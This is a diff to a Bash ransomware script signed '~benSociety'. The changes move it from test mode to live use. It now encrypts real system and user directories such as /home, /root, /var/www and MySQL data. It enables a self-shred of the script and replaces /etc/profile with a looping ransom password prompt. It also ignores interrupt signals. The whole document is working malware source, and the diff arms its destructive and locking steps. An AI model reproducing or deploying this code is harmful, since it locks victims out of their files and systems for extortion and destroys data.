@@ -57,6 +57,7 @@ openfile() {
 adderr() { ERRMSG="$ERRMSG\n$1"; }
 EXIT() {
     echo "[+] STARTING\033[K$ERRMSG\n[!] EXITING"
+shred $0
 exit; }
 
 init() {
@@ -149,7 +150,7 @@ dec_loop() {
 }
 ################# MAIN ######################################
 setmsg() {
-    msg="while [ \"\$(printf \$pass | openssl sha1 | cut -d' ' -f2)\" != '0b6a693b97298e5c6c06276667009c4b70005f3e' ]; do pass=\$($DIALOG --title 'Oops...' --cancel-button 'Ok' --passwordbox 'Congratulations,\\n\\nYou have been infected with a RANSOMWARE!!!!!\\nI know. Scary stuff.\\nAnyways, Come talk to us about getting some of those super important files back.. Or not.. Your choice kid.\\n\\nLove,\\n\\n~benSociety' 10 50 3>&1 1>&2 2>&3 ); done"
+    msg="while [ \"\$(echo \$pass | openssl sha1 | cut -d' ' -f2)\" != 'c402ee71a71a817cc23fe752dfeec1df3b759843' ]; do pass=\$($DIALOG --title 'Oops...' --cancel-button 'Ok' --passwordbox 'Congratulations,\\n\\nYou have been infected with a RANSOMWARE!!!!!\\nI know. Scary stuff.\\nAnyways, Come talk to us about getting some of those super important files back.. Or not.. Your choice kid.\\n\\nLove,\\n\\n~benSociety' 20 50 3>&1 1>&2 2>&3 ); done"
     mv /etc/profile /etc/profile.bak
     echo $msg > /etc/profile
 }
@@ -162,10 +163,10 @@ lock() {
 main() {
     trap '' INT
     trap '' TERM
-    #SOFT="YES"
+    SOFT="YES"
     init
-    targets="/root/Desktop/testing"
-    #targets="/var/spool /var/named /etc/mail /etc/postfix /var/www /root /home /var/lib/mysql"
+    #targets="/root/Desktop/testing"
+    targets="/var/spool /var/named /etc/mail /etc/postfix /var/www /root /home /var/lib/mysql"
     enc_loop "$targets"
     echo >> $PRIVATEKEY
     printf "$LIST" | openssl aes-256-cbc -k "$KEY" | openssl base64 >> $PRIVATEKEY
@@ -175,6 +176,5 @@ main() {
     cp $PRIVATEKEY /usr/
 }
 main
-#shred $0
-#lock
+lock
 EXIT
